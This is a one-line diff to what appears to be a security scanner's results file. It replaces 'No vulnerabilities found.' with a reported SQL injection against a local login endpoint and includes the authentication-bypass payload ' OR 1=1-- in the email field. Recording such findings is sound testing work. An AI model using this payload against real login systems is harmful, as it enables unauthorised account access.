@@ -1,1 +1,1 @@
-No vulnerabilities found.
+SQL injection: (http://localhost:4000/rest/user/login, POST data: {"email":"dsgyagya@gmail.com' OR 1=1--","password":"12345"})
